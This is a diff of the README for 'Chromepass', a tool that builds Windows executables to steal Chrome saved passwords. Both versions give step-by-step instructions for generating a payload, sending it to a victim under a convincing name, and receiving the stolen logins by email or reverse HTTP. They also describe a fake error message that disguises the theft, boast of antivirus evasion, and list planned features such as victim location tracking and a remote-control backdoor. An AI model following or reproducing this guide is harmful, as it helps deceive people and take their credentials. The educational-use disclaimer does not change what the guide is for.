@@ -1,174 +1,124 @@
-#  Hacking Chrome Saved Passwords
-
-***Version info: V3.9.9*** (released 21st January 2019)
-
-### Detection:
-It is rare for it to be detected, but could happen, mostly due to Py2Exe triggering false positives.  
-[Here's a link to a virustotal scan](https://www.virustotal.com/#/file/89c21d936cdd7ee0a99645ff4698712327d9b539cf1c76944cc67c30cb2d2837/detection)  
-[Here's a link to a Jotti scan](https://virusscan.jotti.org/en-US/filescanjob/yfl3mgm5zn)  
-Note that Anti-AV techniques weren't explicitly used yet. That's for a future release if there's ever a need for it, considering the future features that are planned.
-
-### Features:
-
-	
-	1. Grabs Google Chrome saved passwords
-	2. Sends these passwords to the attacker via 
-		* Email OR, 
-		* HTTP directly to the attacker computer
+# Chromepass - Hacking Chrome Saved Passwords
+<p align="center">
+	  <a href="https://img.shields.io/badge/Platform-Windows-green">
+    <img src="https://img.shields.io/badge/Platform-Windows-green" />
+  </a>
+	<a href="https://img.shields.io/github/v/release/darkarp/chromepass">
+	<img src="https://img.shields.io/github/v/release/darkarp/chromepass" alt="Release" />
+	</a>
 		
-	3. Option of having a fake Error Message appear
-	4. Custom Icon
+  <a href="https://travis-ci.org/darkarp/chrome-password-hacking.svg?branch=master">
+    <img src="https://travis-ci.org/darkarp/chrome-password-hacking.svg?branch=master" alt="Build Status on CircleCI" />
+	</a>
+	<a href="https://img.shields.io/maintenance/yes/2021">
+    <img src="https://img.shields.io/maintenance/yes/2021" />
+  </a>
+	</br>
+<a href="https://img.shields.io/github/downloads/darkarp/chromepass/total">
+	<img src="https://img.shields.io/github/downloads/darkarp/chromepass/total" />
+	</a>
+  
+  <a href="https://img.shields.io/github/last-commit/darkarp/chromepass">
+    <img src="https://img.shields.io/github/last-commit/darkarp/chromepass" />
+  </a>
+<a href="https://img.shields.io/github/license/darkarp/chromepass">
+    <img src="https://img.shields.io/github/license/darkarp/chromepass" />
+  </a>
+  </br>
+  <a href="https://discord.gg/beczNYP">
+    <img src="https://img.shields.io/badge/discord-join-7289DA.svg?logo=discord&longCache=true&style=flat" />
+  </a>
 
-PS: This was originally part of one of my malwares so I had to adjust. I didn't have time to clean it up yet that's why it looks so messy.
+Chromepass is a python-based console application that generates a windows executable with the following features:
 
-### To do:
-* Sending Real-time precise location of the victim (**completed, releases next update**)
-* Option of installing a backdoor allowing remote control of the victim's computer (**completed, releases next update**)
-* Recode in python 3 (**in progress**)
-* Custom Fake message (**in progress**)
-* Support for more email providers (**in progress**)
-* Also steal passwords from other programs, such as keychains(**in progress**)
-* Also steal Firefox passwords (**delayed**)
+  - Decrypt Chrome saved paswords
+  - Send a file with the login/password combinations remotely (email or reverse-http)
+  - Custom icon
+  - Completely undetectable by AntiVirus Engines
 
-### Pre Requisites:
+# AV Detection!
+Due to the way this has been coded, it is currently fully undetected. Here are some links to scans performed using a variety of websites
+  - [VirusTotal Scan](https://www.virustotal.com/gui/file/9ca69d2c60f0db6c09e9959b6f9c8bfdf66ddbe2e28f9f7539fd2856b62315c0/detection) (0/68)
+  - [AntiScan](https://antiscan.me/scan/new/result?id=kmpsMNccfuRJ) (0/26)
+  - [Hibrid Analysis](https://www.hybrid-analysis.com/sample/9ca69d2c60f0db6c09e9959b6f9c8bfdf66ddbe2e28f9f7539fd2856b62315c0) All Clean (CrowdStrike Falcon, MetaDefender and Virustotal)
 
-(**This program can be ran from Windows 7 to Windows 10 (all versions)**)
+### Dependencies and Requirements
 
-   1. Python 2.7	-  [Download](https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi)
-			 
-   2. PyWin32	-  Installable by runing `pip install pypiwin32`  OR (if you get an error):  
-   		`C:\Python27\Scripts\pip.exe install pywin32`
-			 
-   3. Requests	-  Installable by runing `pip install requests`   OR (if you get an error):  
-		`C:\Python27\Scripts\pip.exe install requests`
-			 
-   4. py2exe 	-  [Download](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download)
-			 
+This is a very simple application, which uses only:
 
-### **IMPORTANT**: 
-Enviroment Variables: It's recommended that you add the python executable to path. This can be done from installation, after you click the first "next", it will ask you to customize python. The only thing you need to do is scroll down and click on "Add python.exe to path" and select "will be installed". 
-This isn't required.
+* [Python] - Only tested on 3.7.4 but should work in 3.6+
 
-# Quick usage:
-My recommendation for using it is quite simple. Create a gmail account. Allow insecure apps.
-Run the create_server.py and follow instructions. Then you can send the generated server.exe to the victim
+### Installation
 
-# Instructions (More detailed):
+Chromepass requires [Python] 3.6+ to run.
 
+Install the dependencies.
 
-## Local Exploitation (If your target is in the same network as you):
+```powershell
+> cd chromepass
+> pip install -r requirements.txt
+```
 
-	
-	1. If you want a custom icon place the icon on the same 
-	directory as the scripts and rename it "icon.ico', replacing 
-	the file that was already there with the same name. 
-	If you don't want a custom icon, *skip this step*.
-	
-	
-	2. If you want a custom icon, place the icon on the same 
-	directory as the scripts and rename it "icon.ico', replacing 
-	the file that was already there with the same name. 
-	If you don't want a custom icon, **skip this step**.
-	
-	
-	
-	3. Create server by runing the python script "create_server.py"
-	It will then ask you to choose between 2 options, either email or client.exe.
-	
-		* (1) If you choose email you first need to create a gmail account 
-		and then input the created username and password into the program. You
-		will then need to enable less secure apps to run:
-		(https://support.google.com/accounts/answer/6010255?hl=en).
-		You might also want to Check this out: 
-		https://support.google.com/accounts/answer/6010255?hl=en
-		* (2) If you choose the client.exe, it will ask you for your local ip.
-		To find this ip open up CMD and type "ipconfig", it should be listed as IPv4
-		
-		
-	4. Then it will ask you if you want to enable the fake message. 
-	This is a fake Error that appears when someone tries to open the program, 
-	to make it look more legitimate. Type **Y** if you want to activate it (recommended)
-	or **N** if you don't.
-	
-		
-	5. Start the client.exe **Skip this step if you have chosen step number (1) before**
-	(I like having the client, and all other files in a directory in "C:\", like "C:\ChromePass\[files]")
-	
-	
-	6. Send the server.exe to your target 
-	(choosing an appropriate name is always important)
-	
-	
-	7. You will obtain a password text file in the same location 
-	as the client, or in your email depending on how you decided
-	with all the Google Chrome Passwords.
+If any errors occur make sure you're running on the proper environment (if applcable) and if you have python 3.6+ (preferably 3.7.4)
+If the errors persist, try:
+```powershell
+> python -m pip install --upgrade pip
+> python -m pip install -r requirements.txt
+```
+
+### Running
+
+Chromepass is very straightforward. Start by running:
+```powershell
+> python create_server.py
+```
+It will ask you to select between two options:
+*  **(1) via email**  _[_To be fixed_]_
+    * This will ask you for an ***email*** address and a ***password***
+    * It will then ask you if you wish to send to another address or to yourself
+    * Next, you're asked if you want to display an error message. This is a fake message that if enabled will appear when the victim opens the executable, after the passwords have been transferred.
+    * You can then write your own message or leave it blank
+    * You're done! Wait for the executable to be generated and then it's ready.
+    
+*  **(2) via client.exe** _[Recommended at the moment]_
+    * First you're asked to input an ***IP Address*** for a reverse connection. This is the address that belongs to the attacker. It can be a ***local IP address*** or a ***remote IP Address***. If a remote address is chosen, [Port Forwarding](https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/) needs to be in place.
+    * You're then asked if you want to display an error message. This is a fake message that if enabled will appear when the victim opens the executable, after the passwords have been transferred.
+    * You can then write your own message or leave it blank
+    * You're done! Wait for the executables to be generated and then it's ready.
+    * The **client.exe** must be started before the **server_ip.exe**. The **server_ip.exe** is the file the victim receives.
 
 
-## Remote Exploitation (If target is NOT on the same network as you):
 
-	1. If you want a custom icon place the icon on the same directory as the 
-	scripts and rename it "icon.ico', replacing the file that was already there with the same name. 
-	If you don't want a custom icon, *skip this step*.
-	
-	
-	2. If you want a custom icon, place the icon on the same directory as the scripts 
-	and rename it "icon.ico', replacing the file that was already there with the same name. 
-	If you don't want a custom icon, **skip this step**.	
-	
-	
-	3. Create server by runing the python script "create_server.py"
-	It will then ask you to choose between 2 options, either email or client.exe.
-	
-		* (1) If you choose email you first need to create a gmail account 
-		and then input the created username and password into the program. You
-		will then need to enable less secure apps to run:
-		(https://support.google.com/accounts/answer/6010255?hl=en).
-		You might also want to Check this out: 
-		https://support.google.com/accounts/answer/6010255?hl=en
-		
-		* (2) If you choose the client.exe, it will ask you for your ip.
-		 you must type your PUBLIC ip (ex: 152.162.93.12). 
-		You can obtain your public ip by typing "WhatIsMyIp" on Google.
-	
-	
-	4. Setup Port forwading. You want to forward the port 80 to your machine 
-	(look up how to do that if you don't know), you can use this guide:
-	https://www.howtogeek.com/66214/how-to-forward-ports-on-your-router/
-	You can then test if your port forwarding was successful using this website:
-	http://canyouseeme.org/
-	
-	**Skip step 5 if you have chosen number (1) during step 3**
-	
-	5. Start the client.exe 
-	(I recommend having the client, alongside all other files in a directory in 
-	"C:\", like "C:\ChromePass\[all_files]")
+### Development
 
 
-	6. Send the server.exe to your target 
-	(choosing an appropriate name is always important)
-	
-	
-	7. You will obtain a password text file in the same location 
-	as the client, or in your email depending on how you decided
-	with all the Google Chrome Passwords.
-	
+### Todos
+ - Sending Real-time precise location of the victim (***completed, releases next update***)
+ - Also steal Firefox passwords (***Completed, releases next update***)
+ - Option of installing a backdoor allowing remote control of the victim's computer (***completed, releases next update***)
+ - Support for more email providers (***in progress***)
+ - Also steal passwords from other programs, such as keychains(***in progress***)
+ - Add Night Mode (***in progress***)
+ 
+### Errors and Bugs
 
-	
-## NOTE:
-	DO NOT change the name of the python scripts or text files. 
-	  
-	If everything seems to work but you aren't receiving the text file, try moving yor client.exe to 
-	C:\ directory (i.e. "C:\client.exe") and run both client and server again.  
-	  
-	In case you're using the client method (not the email one):
-		Make sure the client is runing before the server runs
-		Password text file will be saved in the same diretory as the client.exe file.
-	
+If you find an error or a bug, please report it as an issue.
 
-### Feel free to join my Discord Server: [Whitehat Hacking](https://discord.gg/qBfC36j)
+### Learn More
 
-#### Any questions open up an issue on GitHub or contact me at: MarioNascimento@ITCrashSecurity.com
-#### Please make sure your issue hasn't been answered before, to avoid duplicate issues on Github page.
+For access to a community full of aspiring computer security experts, ranging from the complete beginner to the seasoned veteran,
+join our Discord Server: [WhiteHat Hacking](https://discord.gg/beczNYP)
+
+If you wish to contact me, you can do via: marionascimento@itsec.us
+
+### Disclaimer
+I am not responsible for what you do with the information and code provided. This is intended for professional or educational purposes only.
+
+License
+----
+
+MIT
 
 
-#### DISCLAIMER: I will not be held responsible for the misuse of these scripts. EDUCATIONAL or PROFESSIONAL use only
+   
+[Python]: <https://www.python.org/downloads/>
